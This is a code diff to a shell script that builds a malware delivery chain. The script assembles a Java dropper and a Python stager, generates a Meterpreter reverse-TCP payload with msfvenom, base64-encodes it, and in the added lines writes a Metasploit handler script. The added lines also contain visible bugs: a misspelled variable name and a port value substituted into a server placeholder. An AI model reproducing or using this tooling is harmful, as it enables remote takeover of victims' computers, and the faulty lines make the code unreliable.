@@ -12,6 +12,8 @@ dropperclass="bin/Dropper.class"
 dropper="bin/Dropper.jar"
 stagerin="templates/stager.py"
 stagerout="www/stager.py"
+handlerin="templates/handler.rc"
+handlerout="handler.rc"
 msf="/opt/metasploit-framework/msfvenom"
 payload="python/meterpreter/reverse_tcp"
 
@@ -55,4 +57,8 @@ echo "[>] Encoding..."
 cat $shellcode | base64 > $tmp && mv $tmp $shellcode && rm $tmp &>/dev/null
 echo "[>] Configuring stager..."
 sed 's%'"__SERVER__"'%'"$url"'%' < $stagerin > $stagerout
+echo "[>] Generating msf rc script"
+sed 's%'"__LHOST__"'%'"$lhost"'%' < $handlerin > $handlerout
+mv $handerout _
+sed 's%'"__SERVER__"'%'"$lport"'%' < _ > $handlerout
 echo "[+] Done!!!"
